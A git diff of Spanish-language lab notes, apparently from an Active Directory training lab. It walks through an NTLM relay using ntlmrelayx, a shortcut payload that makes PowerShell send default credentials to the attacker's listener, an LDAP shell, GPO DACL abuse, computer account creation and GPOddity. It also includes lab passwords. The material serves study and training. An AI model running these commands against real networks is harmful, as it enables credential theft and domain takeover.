@@ -285,14 +285,16 @@ En primer lugar tendremos que usar *ntlmrelayx* que la ejecutaremos en la maquin
 ```shell
 sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '8081' -i --no-smb-server
 ```
+*WSLToTh3Rescue!*
 
-Una vez ejecutado en nuestra maquina virtual deberemos de crear en la ruta de AD\Tools un acceso directo con el siguiente payload
+Una vez ejecutado, en nuestra maquina virtual deberemos de crear en la ruta de AD\Tools un acceso directo con el siguiente payload
 ```shell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97:8081' -UseDefaultCredentials"
 ```
 
 Y lo copiaremos al recurso compartido dcoro-ci\AI
 ```shell
+[studen97]
 xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
 ```
 
@@ -301,19 +303,19 @@ La automatización ejecutara el archivo y se creara una conexión en caso de no 
 nc 127.0.0.1 11000
 ```
 
+Habremos obtenido una shell como *devopsadmin*
+
 Sobre este usuario intentamos darle permisos sobre la Política de DevOps con distinguishedname  {0BF8D01C-1F62-4BDC-958C-57140B67D147} usando
 ```shell
+[dcorp\devopsadmin]
 write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
+
+```ad-warning
 
 En caso de no poder hacerlo por que el usuario no conste en la maquina podemos crear un usuario nuevo
 ```shell
 add_computer std97-gpattack Secretpass@123
-```
-
-Y ahora ya poder aprovecharnos de la politica
-```shell
-write_gpo_dacl std97-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
 
 Una ves tengamos la respuesta necesaria con nuestro Have Fun, deberemos de detener el interprete de comandos LDAP y el ntlmrelayx y así poder ejecutar GPOddity
